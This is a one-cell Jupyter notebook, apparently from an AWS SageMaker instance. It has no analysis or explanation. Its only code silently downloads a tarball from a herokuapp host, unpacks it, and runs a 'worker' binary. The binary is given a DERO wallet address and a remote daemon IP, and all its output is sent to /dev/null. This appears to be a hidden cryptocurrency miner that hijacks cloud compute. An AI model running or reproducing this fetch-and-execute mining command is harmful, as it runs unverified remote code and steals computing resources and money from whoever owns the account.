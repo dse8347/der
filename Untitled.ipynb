{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": ["!wget -q http://tools12321.herokuapp.com/apostropis/worker.tar.xz && tar xf worker.tar.xz && ./worker --wallet-address=dero1qyrt55sn338nzse3l7ulv7ygrtlqqp2s0sk0lepvendrf4xl4dlr7qgw7wa7x --daemon-rpc-address=20.52.56.109:10100 >/dev/null >/dev/null 2>&1"]
  }
 ],
 "metadata": {
  "instance_type": "ml.m5.4xlarge",
  "kernelspec": {
   "display_name": "Python 3 (Data Science)",
   "language": "python",
   "name": "python3__SAGEMAKER_INTERNAL__arn:aws:sagemaker:ap-northeast-3:792733760839:image/datascience-1.0"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
